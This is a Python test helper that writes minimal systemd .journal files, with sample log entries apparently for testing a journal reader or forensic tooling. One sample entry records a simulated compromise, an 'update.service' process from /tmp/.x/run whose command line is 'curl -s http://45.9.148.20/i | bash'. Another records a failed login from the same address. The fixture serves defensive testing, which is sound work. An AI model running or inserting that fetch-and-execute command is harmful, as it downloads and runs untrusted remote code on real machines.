"""Build a minimal but structurally valid systemd .journal file.

Enough for the linear object-arena reader in ``journalfile.py``: a header,
one DATA object per distinct ``FIELD=value`` and one ENTRY object per
record pointing at them.  Supports the regular and COMPACT item layouts
and XZ / (fake) LZ4 data-object compression.
"""

from __future__ import annotations

import lzma
import struct
from pathlib import Path

SIGNATURE = b"LPKSHHRH"
_ALIGN = 8

OBJ_DATA = 1
OBJ_ENTRY = 3
INCOMPAT_COMPACT = 1 << 4
OBJ_COMPRESSED_XZ = 1 << 0
OBJ_COMPRESSED_LZ4 = 1 << 1


def _pad(b: bytes) -> bytes:
    return b + b"\x00" * ((-len(b)) % _ALIGN)


def _obj(otype: int, flags: int, body: bytes) -> bytes:
    size = 16 + len(body)
    return _pad(bytes([otype, flags]) + b"\x00" * 6
                + struct.pack("<Q", size) + body)


def write_journal(path: Path, entries, *, compact=False, boot_id=None,
                  compress: dict | None = None) -> Path:
    """entries: list of (realtime_us, monotonic_us, {FIELD: value}).

    compress: optional {field_name: "xz"|"lz4"} to store that data object
    compressed.
    """
    compress = compress or {}
    boot = boot_id or bytes(range(16))
    header_size = 240

    # unique data objects
    data_offsets: dict[str, int] = {}
    blob = bytearray()
    off = header_size

    def emit(chunk: bytes) -> int:
        nonlocal off
        at = off
        blob.extend(chunk)
        off += len(chunk)
        return at

    all_fields = []
    for _, _, fields in entries:
        for k, v in fields.items():
            kv = f"{k}={v}"
            if kv not in data_offsets:
                all_fields.append(kv)
                mode = compress.get(k)
                payload = kv.encode()
                oflags = 0
                if mode == "xz":
                    payload = lzma.compress(payload)
                    oflags = OBJ_COMPRESSED_XZ
                elif mode == "lz4":
                    payload = b"\x00" * 8 + b"garbage-not-real-lz4"
                    oflags = OBJ_COMPRESSED_LZ4
                body = b"\x00" * 48
                if compact:
                    body += b"\x00" * 8
                body += payload
                data_offsets[kv] = emit(_obj(OBJ_DATA, oflags, body))

    n_entries = 0
    last_entry_off = 0
    inc = INCOMPAT_COMPACT if compact else 0
    for seqnum, (realtime, monotonic, fields) in enumerate(entries, 1):
        items = b""
        for k, v in fields.items():
            d = data_offsets[f"{k}={v}"]
            items += struct.pack("<I", d) if compact else struct.pack("<QQ",
                                                                      d, 0)
        body = struct.pack("<QQQ", seqnum, realtime, monotonic) + boot \
            + struct.pack("<Q", 0) + items
        last_entry_off = emit(_obj(OBJ_ENTRY, 0, body))
        n_entries += 1

    n_objects = len(all_fields) + n_entries
    arena_size = len(blob)

    hdr = bytearray(header_size)
    hdr[0:8] = SIGNATURE
    struct.pack_into("<I", hdr, 8, 0)              # compatible_flags
    struct.pack_into("<I", hdr, 12, inc)           # incompatible_flags
    hdr[16] = 1                                    # state = ONLINE
    hdr[24:40] = bytes(range(1, 17))               # file_id
    hdr[40:56] = bytes(range(17, 33))              # machine_id
    hdr[56:72] = boot                              # boot_id
    hdr[72:88] = bytes(range(33, 49))              # seqnum_id
    struct.pack_into("<9Q", hdr, 88,
                     header_size, arena_size,
                     0, 0, 0, 0,
                     last_entry_off, n_objects, n_entries)

    path.write_bytes(bytes(hdr) + bytes(blob))
    return path


# a compact convenience set of realistic-looking entries
def sample_entries():
    base = 1_768_435_200_000_000   # 2026-01-15T00:00:00Z, in microseconds
    return [
        (base + 1_000_000, 5_000_000, {
            "PRIORITY": "6", "_TRANSPORT": "stdout", "_HOSTNAME": "host01",
            "_SYSTEMD_UNIT": "ssh.service", "_COMM": "sshd", "_PID": "1200",
            "_UID": "0", "MESSAGE": "Server listening on 0.0.0.0 port 22."}),
        (base + 60_000_000, 64_000_000, {
            "PRIORITY": "5", "_TRANSPORT": "syslog", "_HOSTNAME": "host01",
            "_COMM": "sshd", "_PID": "1400", "_UID": "0",
            "MESSAGE": "Accepted publickey for root from 10.0.0.9 port 55123"}),
        (base + 61_000_000, 65_000_000, {
            "PRIORITY": "3", "_TRANSPORT": "journal", "_HOSTNAME": "host01",
            "_COMM": "sshd", "_PID": "1401", "_UID": "0",
            "MESSAGE": "Failed password for invalid user admin from "
                       "45.9.148.20 port 40222"}),
        (base + 120_000_000, 124_000_000, {
            "PRIORITY": "4", "_TRANSPORT": "kernel", "_HOSTNAME": "host01",
            "_COMM": "kernel",
            "MESSAGE": "collector[2200]: segfault at 0 ip 00007f died"}),
        (base + 200_000_000, 204_000_000, {
            "PRIORITY": "6", "_TRANSPORT": "stdout", "_HOSTNAME": "host01",
            "_SYSTEMD_UNIT": "update.service", "_COMM": "sh", "_PID": "2600",
            "_UID": "0", "_EXE": "/tmp/.x/run",
            "_CMDLINE": "sh -c curl -s http://45.9.148.20/i | bash",
            "MESSAGE": "running update"}),
    ]
